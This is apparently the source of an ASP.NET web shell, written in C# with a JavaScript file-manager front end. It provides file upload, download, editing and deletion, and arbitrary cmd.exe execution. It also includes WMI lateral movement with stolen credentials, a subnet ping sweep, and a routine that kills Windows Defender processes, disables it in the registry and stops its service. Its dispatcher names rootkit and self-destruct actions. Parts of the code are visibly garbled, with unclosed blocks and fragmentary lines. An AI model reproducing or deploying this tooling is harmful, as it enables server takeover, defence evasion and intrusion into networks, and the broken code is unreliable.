    // ─── PAGE LOAD ROUTER ──────────────────────────────
    protected void Page_Load(object sender, EventArgs e)
    {
        // Cookie-based session restore
        if (Session["beast_auth"] == null && Request.Cookies["beast_sess"] != null)
        {
            try
            {
                string dec = DecryptString(Convert.FromBase64String(
                    Request.Cookies["beast_sess"].Value));
                var parts = dec.Split('|');
                if (parts.Length == 3 && parts[0] == USERNAME &&
                    DateTime.UtcNow < DateTime.Parse(parts[2]))
                {
                    Session["beast_auth"] = true;
                }
            }
            catch { }
        }

        // API handler — all POST actions when authenticated
        if (Request.HttpMethod == "POST" &&
            Request.Form["action"] != null &&
            Request.Form["action"] != "login")
        {
            if (Session["beast_auth"] == null || !(bool)Session["beast_auth"])
            {
                Response.Write("{\"error\":\"not_authenticated\"}");
                Response.End();
                return;
            }
            HandleApiAction(Request.Form["action"]);
            Response.End();
            return;
        }

        // Login handler
        if (Request.HttpMethod == "POST" && Request.Form["action"] == "login")
        {
            if (SecureCompare(Request.Form["username"], USERNAME) &&
                SecureCompare(Request.Form["password"], PASSWORD))
            {
                Session["beast_auth"] = true;
                Session.Timeout = 480;

                string cookiePayload = USERNAME + "|" +
                    PASSWORD + "|" +
                    DateTime.UtcNow.AddYears(1).ToString("o");
                HttpCookie cookie = new HttpCookie("beast_sess");
                cookie.Value = Convert.ToBase64String(
                    EncryptString(cookiePayload));
                cookie.HttpOnly = true;
                cookie.Secure = Request.IsSecureConnection;
                cookie.Expires = DateTime.UtcNow.AddYears(1);
                Response.Cookies.Add(cookie);
                Response.Redirect(Request.RawUrl);
            }
            else
            {
                RenderLogin("Invalid credentials.");
            }
            Response.End();
            return;
        }

        // Logout
        if (Request.QueryString["logout"] != null)
        {
            Session.Clear();
            if (Request.Cookies["beast_sess"] != null)
            {
                HttpCookie dead = new HttpCookie("beast_sess");
                dead.Expires = DateTime.UtcNow.AddDays(-1);
                Response.Cookies.Add(dead);
            }
            Response.Redirect(Request.RawUrl.Split('?')[0]);
            Response.End();
            return;
        }

        // Render appropriate page
        if (Session["beast_auth"] != null && (bool)Session["beast_auth"])
        {
            RenderDashboard();
        }
        else
        {
            RenderLogin(null);
        }
    }

    // ─── API HANDLER ────────────────────────────────────
    private void HandleApiAction(string action)
    {
        try
        {
            switch (action)
            {
                case "list":        ApiListFiles(); break;
                case "download":    ApiDownloadFile(); break;
                case "upload":      ApiUploadFile(); break;
                case "delete":      ApiDeleteFile(); break;
                case "delete_dir":  ApiDeleteDir(); break;
                case "rename":      ApiRenameFile(); break;
                case "new_folder":  ApiNewFolder(); break;
                case "new_file":    ApiNewFile(); break;
                case "read_file":   ApiReadFile(); break;
                case "write_file":  ApiWriteFile(); break;
                case "exec":        ApiExecuteCmd(); break;
                case "sysinfo":     ApiSystemInfo(); break;
                case "proc_list":   ApiProcessList(); break;
                case "proc_kill":   ApiKillProcess(); break;
                case "lateral_wmi": ApiLateralWmi(); break;
                case "lateral_scan":ApiNetworkScan(); break;
                case "smb_enum":    ApiSmbEnum(); break;
                case "rootkit":     ApiInstallRootkit(); break;
                case "neutralize":  ApiNeutralizeSecurity(); break;
                case "selfdestruct":ApiSelfDestruct(); break;
                default:
                    Response.Write("{\"error\":\"unknown_action\"}");
                    break;
            }
        }
        catch (Exception ex)
        {
            Response.Write("{\"error\":\"" +
                JsonEscape(ex.Message) + "\"}");
        }
    }

    // ─── FILE MANAGER API ───────────────────────────────
    private void ApiListFiles()
    {
        string dir = Request.Form["dir"] ?? Server.MapPath("~");
        dir = SanitizePath(dir);

        if (!Directory.Exists(dir))
        {
            Response.Write("{\"error\":\"directory_not_found\"}");
            return;
        }

        var result = new StringBuilder();
        result.Append("{\"path\":\"" + JsonEscape(dir) + "\",");
        result.Append("\"parent\":\"" +
            JsonEscape(Directory.GetParent(dir)?.FullName ?? dir) + "\",");
        result.Append("\"items\":[");

        bool first = true;

        // Directories first
        foreach (string d in Directory.GetDirectories(dir))
        {
            if (!first) result.Append(",");
            first = false;
            var info = new DirectoryInfo(d);
            result.Append("{");
            result.Append("\"name\":\"" + JsonEscape(info.Name) + "\",");
            result.Append("\"type\":\"dir\",");
            result.Append("\"size\":\"-\",");
            result.Append("\"modified\":\"" +
                info.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") + "\"");
            result.Append("}");
        }

        // Then files
        foreach (string f in Directory.GetFiles(dir))
        {
            if (!first) result.Append(",");
            first = false;
            var info = new FileInfo(f);
            result.Append("{");
            result.Append("\"name\":\"" + JsonEscape(info.Name) + "\",");
            result.Append("\"type\":\"file\",");
            result.Append("\"size\":\"" + FormatSize(info.Length) + "\",");
            result.Append("\"size_bytes\":" + info.Length.ToString() + ",");
            result.Append("\"modified\":\"" +
                info.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") + "\"");
            result.Append("}");
        }

        result.Append("]}");
        Response.Write(result.ToString());
    }

    private void ApiDownloadFile()
    {
        string path = SanitizePath(Request.Form["path"]);
        if (!File.Exists(path))
        {
            Response.Write("{\"error\":\"file_not_found\"}");
            return;
        }

        Response.Clear();
        Response.ContentType = "application/octet-stream";
        Response.AddHeader("Content-Disposition",
            "attachment; filename=\"" +
            Path.GetFileName(path) + "\"");
        Response.TransmitFile(path);
        Response.End();
    }

    private void ApiUploadFile()
    {
        string dir = SanitizePath(Request.Form["dir"] ?? Server.MapPath("~"));
        if (!Directory.Exists(dir))
        {
            Response.Write("{\"error\":\"target_dir_not_found\"}");
            return;
        }

        if (Request.Files.Count == 0)
        {
            Response.Write("{\"error\":\"no_file\"}");
            return;
        }

        var uploaded = Request.Files[0];
        string dest = Path.Combine(dir,
            Path.GetFileName(uploaded.FileName));
        uploaded.SaveAs(dest);
        Response.Write("{\"ok\":true,\"dest\":\"" +
            JsonEscape(dest) + "\"}");
    }

    private void ApiReadFile()
    {
        string path = SanitizePath(Request.Form["path"]);
        if (!File.Exists(path))
        {
            Response.Write("{\"error\":\"not_found\"}");
            return;
        }

        var info = new FileInfo(path);
        if (info.Length > 2 * 1024 * 1024) // 2MB cap for editing
        {
            Response.Write("{\"error\":\"file_too_large\",\"size\":" +
                info.Length.ToString() + "}");

        string content = File.ReadAllText(path, Encoding.UTF8);
        Response.Write("{\"ok\":true,\"content\":\"" +
            JsonEscape(content) + "\",\"size\":" +
            info.Length.ToString() + "}");
    }

    private string ExecuteCommand(string cmd)
    {
        var psi = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c " + cmd,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            StandardOutputEncoding = Encoding.GetEncoding(437),
            StandardErrorEncoding = Encoding.GetEncoding(437)
        };

        var sb = new StringBuilder();
        using (var proc = Process.Start(psi))
        {
            sb.Append(proc.StandardOutput.ReadToEnd());
            sb.Append(proc.StandardError.ReadToEnd());
            if (!proc.WaitForExit(30000))
            {
                proc.Kill();
                sb.Append("\r\n[ERROR] Command timed out (30s)");
            }
            sb.Append("\r\n[EXIT CODE: " +
                proc.ExitCode.ToString() + "]");
        }
        return sb.ToString();
    }

    // ─── LATERAL MOVEMENT ───────────────────────────────
    private void ApiLateralWmi()
    {
        string target = Request.Form["target"] ?? "";
        string user = Request.Form["l_user"] ?? "";
        string pass = Request.Form["l_pass"] ?? "";
        string cmd = Request.Form["l_cmd"] ?? "whoami";

        if (string.IsNullOrEmpty(target))
        {
            Response.Write("{\"error\":\"no_target\"}");
            return;
        }

        try
        {
            var options = new ConnectionOptions();
            if (!string.IsNullOrEmpty(user))
            {
                options.Username = user;
                options.Password = pass;
            }
            options.Authentication =
                AuthenticationLevel.PacketPrivacy;
            options.Impersonation =
                ImpersonationLevel.Impersonate;

            var scope = new ManagementScope(
                @"\\" + target + @"\root\cimv2", options);
            scope.Connect();

            var wmiClass = new ManagementClass(
                scope,
                new ManagementPath("Win32_Process"),
                new ObjectGetOptions());

            var inParams = wmiClass.GetMethodParameters("Create");
            inParams["CommandLine"] = "cmd.exe /c " + cmd;

            var outParams = wmiClass.InvokeMethod(
                "Create", inParams, null);

            uint returnValue =
                (uint)outParams["ReturnValue"];
            uint processId =
                (uint)outParams["ProcessId"];

            string output = "WMI Execution Result:\\n" +
                "ReturnValue: " + returnValue.ToString() +
                " (0 = success)\\n" +
                "ProcessId: " + processId.ToString() + "\\n";

            Response.Write("{\"ok\":true,\"output\":\"" +
                JsonEscape(output) + "\"}");
        }
        catch (Exception ex)
        {
            Response.Write("{\"error\":\"" +
                JsonEscape("WMI failed: " + ex.Message) + "\"}");
        }
    }

    private void ApiNetworkScan()
    {

        if (string.IsNullOrEmpty(subnet))
        {

            subnet = DetectLocalSubnet();
        }

        var sb = new StringBuilder();
        sb.Append("{\"ok\":true,\"subnet\":\"" +
            JsonEscape(subnet) + "\",\"hosts\":[");

        bool first = true;
        string[] parts = subnet.Split('.');
        if (parts.Length == 4)
        {
            string baseIp = parts[0] + "." + parts[1] +
                "." + parts[2] + ".";

            // Scan 1-254, parallel with timeout
            var tasks = new List<System.Threading.Tasks.Task>();
            var results = new System.Collections.Concurrent
                .ConcurrentBag<string>();

            for (int i = 1; i <= 254; i++)
            {
                string ip = baseIp + i.ToString();
                tasks.Add(System.Threading.Tasks.Task.Run(() =>
                {
                    try
                    {
                        using (var ping = new Ping())
                        {
                            var reply = ping.Send(ip, 300);
                            if (reply.Status == IPStatus.Success)
                            {
                                try
                                {
                                    var hostEntry =
                                        Dns.GetHostEntry(ip);
                                    results.Add(ip + "|" +
                                        hostEntry.HostName);
                                }
                                catch
                                {
                                    results.Add(ip + "|" + ip);
                                }
                            }
                        }
                    }
                    catch { }
                }));
            }

            System.Threading.Tasks.Task.WaitAll(
                tasks.ToArray(), 60000);

            foreach (string r in results)
            {
                if (!first) sb.Append(",");
                first = false;
                string[] rp = r.Split('|');
                sb.Append("{\"ip\":\"" +
                    JsonEscape(rp[0]) + "\",\"hostname\":\"" +
                    JsonEscape(rp[1]) + "\"}");
            }
        }

        sb.Append("]}");
        Response.Write(sb.ToString());
    }

    private string DetectLocalSubnet()
    {
        foreach (NetworkInterface ni in
            NetworkInterface.GetAllNetworkInterfaces())
        {
            if (ni.OperationalStatus == OperationalStatus.Up)
            {
                foreach (UnicastIPAddressInformation ip in
                    ni.GetIPProperties().UnicastAddresses)
                {
                    if (ip.Address.AddressFamily ==
                        System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        string addr = ip.Address.ToString();
                        string mask = ip.IPv4Mask.ToString();
                        // Calculate network base
                        string[] addrParts = addr.Split('.');
                        string[] maskParts = mask.Split('.');
                        string[] netParts = new string[4];
                        for (int i = 0; i < 4; i++)
                        {
                            netParts[i] = (int.Parse(addrParts[i]) &
                                int.Parse(maskParts[i])).ToString();
                        }
                        return string.Join(".", netParts) + ".0/24";
                    }
                }
            }
        }
        return "192.168.1.0/24";
    }

    // ─── NEUTRALIZE SECURITY ────────────────────────────
    private void ApiNeutralizeSecurity()
    {
        var results = new StringBuilder();
        results.Append("Security Neutralization Report:\\n\\n");

        // Kill Defender processes
        string[] targets = {
            "MsMpEng", "NisSrv", "SenseCncProxy",
            "SenseIR", "SenseSampleUploader",
            "WindowsDefender", "mpcmdrun"
        };

        foreach (string name in targets)
        {
            try
            {
                foreach (Process p in
                    Process.GetProcessesByName(name))
                {
                    p.Kill();
                    results.Append("[KILLED] " + name +
                        " (PID " + p.Id.ToString() + ")\\n");
                }
            }
            catch { }
        }

        // Disable Defender via registry
        try
        {
            using (var key = Microsoft.Win32.Registry
                .LocalMachine.OpenSubKey(
                    @"SOFTWARE\Policies\Microsoft\" +
                    @"Windows Defender", true))
            {
                if (key != null)
                {
                    key.SetValue("DisableAntiSpyware", 1,
                        Microsoft.Win32.RegistryValueKind.DWord);
                    results.Append("[REG] DisableAntiSpyware = 1\\n");
                }
            }
        }
        catch (Exception ex)
        {
            results.Append("[REG FAIL] " + ex.Message + "\\n");
        }

        // Stop WinDefend service
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "net",
                Arguments = "stop WinDefend",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (var p = Process.Start(psi))
            {
                p.WaitForExit(10000);
                results.Append("[SERVICE] net stop WinDefend: " +
                    p.StandardOutput.ReadToEnd().Trim() + "\\n");
            }
        }
        catch (Exception ex)
        {
            results.Append("[SERVICE FAIL] " + ex.Message + "\\n");
        }

        Response.Write("{\"ok\":true,\"output\":\"" +
            JsonEscape(results.ToString()) + "\"}");
    }

    // ─── HELPERS ────────────────────────────────────────
    private string SanitizePath(string path)
    {
        if (string.IsNullOrEmpty(path))
            return Server.MapPath("~");

        // Resolve relative paths and normalize
        try
        {
            string full = Path.GetFullPath(path);
            return full;
        }
        catch
        {
            return Server.MapPath("~");
        }
    }

    private string FormatSize(long bytes)
    {
        string[] sizes = { "B", "KB", "MB", "GB", "TB" };
        int order = 0;
        double len = bytes;
        while (len >= 1024 && order < sizes.Length - 1)
        {
            order++;
            len /= 1024;
        }
        return len.ToString("0.00") + " " + sizes[order];
    }

    private bool SecureCompare(string a, string b)
    {
        if (a.Length != b.Length) return false;
        int result = 0;
        for (int i = 0; i < a.Length; i++)
            result |= a[i] ^ b[i];
        return result == 0;
    }

    private string JsonEscape(string s)
    {
        if (string.IsNullOrEmpty(s)) return "";
        return s.Replace("\\", "\\\\")
                .Replace("\"", "\\\"")
                .Replace("\n", "\\n")
                .Replace("\r", "\\r")
                .Replace("\t", "\\t");
    }

    private byte[] EncryptString(string plainText)
    {
        using (var aes = Aes.Create())
        {
            aes.Key = AES_KEY;
            aes.IV = AES_IV;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using (var encryptor =
                aes.CreateEncryptor())
            {
                byte[] input = Encoding.UTF8.GetBytes(plainText);
                return encryptor.TransformFinalBlock(
                    input, 0, input.Length);
            }
        }
    }

    private string DecryptString(byte[] cipherText)
    {
        using (var aes = Aes.Create())
        {
            aes.Key = AES_KEY;
            aes.IV = AES_IV;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using (var decryptor =
                aes.CreateDecryptor())
            {
                byte[] output = decryptor.TransformFinalBlock(
                    cipherText, 0, cipherText.Length);
                return Encoding.UTF8.GetString(output);
            }
        }
    }

function navigateTo(dir) {
    currentDir = dir;
    refreshFiles();

function refreshFiles() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type',
        'application/x-www-form-urlencoded');
    xhr.onload = function() {
        if (xhr.status === 200) {
            try {
                var data = JSON.parse(xhr.responseText);
                if (data.error) {
                    showToast(data.error, true);
                    return;
                }
                currentDir = data.path;
                renderFileList(data);
                refreshBreadcrumb();
            } catch(e) {
                showToast('Parse error', true);
            }
        }
    };
    xhr.send('action=list&dir=' + encodeURIComponent(currentDir));
}

function renderFileList(data) {
    var tbody = document.getElementById('fileList');

    // Parent directory link
    if (data.parent !== data.path) {
        var tr = document.createElement('tr');
        tr.innerHTML =

            '<div class="fname">' +
            '<span class="ficon">&#128193;</span>' +
            '<a href="#" onclick="navigateTo(\'' +
            escapeHtml(data.parent) + '\')">.. (parent)</a>' +
            '</div></td>';
        tbody.appendChild(tr);
    }

    data.items.forEach(function(item) {
        var tr = document.createElement('tr');
        tr.setAttribute('data-path', data.path + '\\' + item.name);
        tr.setAttribute('data-type', item.type);

        var icon = item.type === 'dir' ? '&#128193;' : '&#128196;';

            escapeHtml(data.path + '\\' + item.name) + '\')">' +
            escapeHtml(item.name) + '</a>' :

            escapeHtml(data.path) + '\',\'' +
            escapeHtml(item.name) + '\')" title="Click to rename">' +
            escapeHtml(item.name) + '</span>';

        tr.innerHTML =
            '<td><div class="fname">' +
            '<span class="ficon">' + icon + '</span>' +
            nameHtml +

            '<td class="fsize">' + escapeHtml(item.size) + '</td>' +

                'downloadFile(\'' +
                escapeHtml(data.path + '\\' + item.name) +

function refreshBreadcrumb() {
    var bc = document.getElementById('breadcrumb');
    var parts = currentDir.split('\\');
    var html = '';
    var accum = '';
    for (var i = 0; i < parts.length; i++) {
        if (i === 0) {
            accum = parts[0];
        } else {
            accum += '\\' + parts[i];
        }
        if (i > 0) html += ' <span>&gt;</span> ';
        html += '<a href="#" onclick="navigateTo(\'' +
            escapeHtml(accum) + '\')">' +
            escapeHtml(parts[i] || (i === 0 ? '\\' : '')) + '</a>';
    }
    bc.innerHTML = html;

function deleteSelected() {
    if (selectedFiles.length === 0) {
        showToast('No files selected', true);
        return;
    }
    if (!confirm('Delete ' + selectedFiles.length + ' item(s)? This cannot be undone.'))
        return;

    var remaining = selectedFiles.length;
    selectedFiles.forEach(function(item) {
        var action = item.type === 'dir' ? 'delete_dir' : 'delete';
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href, true);
        xhr.setRequestHeader('Content-Type',
            'application/x-www-form-urlencoded');
        xhr.onload = function() {
            remaining--;
            if (remaining === 0) {
                refreshFiles();
                showToast('Deleted successfully');
            }
        };
        xhr.send('action=' + action + '&path=' +
            encodeURIComponent(item.path));
    });
}

// ─── UTILS ────────────────────────────────────────
function escapeHtml(s) {
    if (!s) return '';
    return s.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
}

function isTextFile(name) {
    var ext = name.split('.').pop().toLowerCase();
    var textExts = ['txt','log','xml','config','ini','cfg','conf',
        'bat','cmd','ps1','vbs','js','css','html','htm',
        'asp','aspx','php','jsp','py','rb','pl','sh',
        'csv','json','yaml','yml','md','sql','inf','reg'];
    return textExts.indexOf(ext) !== -1;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    var k = 1024;
    var sizes = ['B','KB','MB','GB'];
    var i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}
